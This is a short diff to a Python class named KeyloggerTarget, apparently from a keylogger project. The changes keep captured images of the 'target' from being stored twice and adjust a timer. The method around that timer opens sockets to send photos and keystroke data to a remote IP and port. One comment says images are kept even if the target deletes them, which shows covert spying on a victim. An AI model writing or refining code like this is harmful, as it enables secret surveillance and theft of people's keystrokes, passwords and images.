@@ -117,12 +117,13 @@ class KeyloggerTarget:
         # Saves the image in the current directory
         for every_image in os.listdir():
             if "IMAGE" in every_image:
-                with open(every_image, "rb") as file:
-                    data = b""
-                    for line in file:
-                        data += line
-                    # Gets all the data and stores it in "self.images_data"
-                self.images_data[every_image] = data
+                if every_image not in self.images_data:
+                    with open(every_image, "rb") as file:
+                        data = b""
+                        for line in file:
+                            data += line
+                        # Gets all the data and stores it in "self.images_data"
+                    self.images_data[every_image] = data
         # No matter if the targets deletes the image it will be stored locally
 
         os.remove(fotoname)
@@ -143,7 +144,7 @@ class KeyloggerTarget:
         sys.exit()
 
     def countdown_send(self, zeit, ip_photos, port_photos, ip_keylogger, port_keylogger):
-        seconds_list = [zahl for zahl in range(0, zeit + 1, 20) if zahl != 0]
+        seconds_list = [zahl for zahl in range(1, zeit + 1, 20)]
         # The seconds the image will be sent in 20 steps to the server will be saved in "seconds_list"
         print(seconds_list)
         key_data = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
